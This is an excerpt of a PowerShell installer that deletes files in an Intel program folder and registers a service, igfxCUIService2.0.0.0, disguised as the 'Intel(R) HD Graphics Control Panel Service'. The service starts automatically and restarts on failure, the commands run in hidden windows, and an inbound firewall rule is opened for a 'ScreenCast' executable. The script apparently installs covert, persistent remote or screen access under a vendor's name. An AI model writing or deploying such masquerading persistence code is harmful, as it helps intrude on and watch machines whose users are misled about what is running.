...
function Stop-Remotely {
	Start-Process -FilePath "cmd.exe" -ArgumentList "/c sc delete igfxCUIService2.0.0.0" -Wait -WindowStyle Hidden
...
function Uninstall-Remotely {
	...
	Remove-NetFirewallRule -Name "igfxCUIService2.0.0.0" -ErrorAction SilentlyContinue
}
...
function Install-Remotely {
	...
	Stop-Remotely
	Get-ChildItem -Path "C:\Program Files (x86)\Intel\Intel(R) Management Engine Components\Lang" | Where-Object {$_.Name -notlike "ConnectionInfo.json"} | Remove-Item -Recurse -Force
	...
	New-Service -Name "igfxCUIService2.0.0.0" -BinaryPathName "$InstallPath\igfxEM.exe" -DisplayName "Intel(R) HD Graphics Control Panel Service" -StartupType Automatic -Description "Service for Intel(R) HD Graphics Control Panel"
	Start-Process -FilePath "cmd.exe" -ArgumentList "/c sc.exe failure `"igfxCUIService2.0.0.0`" reset=5 actions=restart/5000" -Wait -WindowStyle Hidden
	Start-Service -Name igfxCUIService2.0.0.0

	New-NetFirewallRule -Name "igfxCUIService2.0.0.0" -DisplayName "Intel(R) HD Graphics Control Panel Service" -Description "Service for Intel(R) HD Graphics Control Panel" -Direction Inbound -Enabled True -Action Allow -Program "C:\Program Files (x86)\Intel\Intel(R) Management Engine Components\Lang\ScreenCast\igfxEMN.exe" -ErrorAction SilentlyContinue
}
